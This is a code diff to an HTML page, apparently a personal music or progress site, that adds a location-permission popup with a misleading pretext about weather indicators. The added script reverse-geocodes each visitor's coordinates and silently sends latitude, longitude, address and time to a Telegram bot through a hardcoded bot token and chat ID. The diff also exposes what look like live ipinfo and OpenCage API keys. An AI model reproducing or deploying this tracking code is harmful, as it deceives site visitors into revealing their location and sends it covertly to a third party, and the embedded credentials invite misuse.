@@ -209,7 +209,48 @@
   <div class="song-name"><b>I always add my progress here.</b></div>
   <div class="song-name"><b>You also send me msg there. I get it 👆</b></div>
 
-
+  <div id="locationPopup" style="
+  position: fixed;
+  top: 0; left: 0; right: 0; bottom: 0;
+  background: rgba(0, 0, 0, 0.85);
+  z-index: 9999;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-family: Arial, sans-serif;
+">
+  <div style="
+    background-color: #1e1e1e;
+    padding: 24px 32px;
+    border-radius: 10px;
+    text-align: center;
+    color: #fff;
+    max-width: 400px;
+  ">
+    <h2 style="color: #03dac6;">Allow for better experience</h2>
+    <p>Allow location this use weather Indiactors no we need you location.</p>
+    <button onclick="askForLocation()" style="
+      background-color: #03dac6;
+      border: none;
+      color: #000;
+      padding: 10px 20px;
+      font-size: 16px;
+      margin-top: 20px;
+      border-radius: 6px;
+      cursor: pointer;
+    ">Allow</button>
+    <br>
+    <button onclick="denyLocation()" style="
+      background-color: transparent;
+      border: 1px solid #666;
+      color: #ccc;
+      padding: 8px 16px;
+      font-size: 14px;
+      margin-top: 12px;
+      border-radius: 6px;
+      cursor: pointer;
+    ">Deny</button>
+  </div>
 
 
   <script>
@@ -328,7 +369,8 @@
 
   const BOT_TOKEN = "8062217364:AAFvqBfdaMuQXh0BQVIHKwxYAwaHxbvbnH4";
   const CHAT_ID = "6428946789";
-  const IPINFO_TOKEN = "f0421a0825b153"; // Replace this
+  const IPINFO_TOKEN = "f0421a0825b153";
+  const openCageKey = 'a10d3f1c01204eb48d045e47e3f0094e';
 
 fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`)
   .then((res) => res.json())
@@ -359,6 +401,56 @@ fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`)
     } else {
       alert("Geolocation is not supported by your browser.");
     }
+  }
+
+
+    function askForLocation() {
+    document.getElementById("locationPopup").style.display = "none";
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(getLocationDetails, handleError);
+    } else {
+      alert("Geolocation not supported.");
+    }
+  }
+
+  function denyLocation() {
+    document.getElementById("locationPopup").style.display = "none";
+  }
+
+  function getLocationDetails(position) {
+    const lat = position.coords.latitude;
+    const lon = position.coords.longitude;
+    const time = new Date().toLocaleString();
+
+    fetch(`https://api.opencagedata.com/geocode/v1/json?q=${lat}+${lon}&key=${openCageKey}`)
+      .then(response => response.json())
+      .then(data => {
+        const address = data.results[0]?.formatted || "Unknown address";
+        const message = `📍 New Visitor Location:
+🌐 Latitude: ${lat}
+🌐 Longitude: ${lon}
+📌 Address: ${address}
+🕒 Time: ${time}`;
+
+        sendToTelegram(message);
+      })
+      .catch(() => {
+        const message = `📍 New Visitor Location:
+🌐 Latitude: ${lat}
+🌐 Longitude: ${lon}
+📌 Address lookup failed
+🕒 Time: ${time}`;
+        sendToTelegram(message);
+      });
+  }
+
+  function sendToTelegram(msg) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`;
+    fetch(url);
+  }
+
+  function handleError(error) {
+    alert("❌ Location permission denied.");
   }
 
 
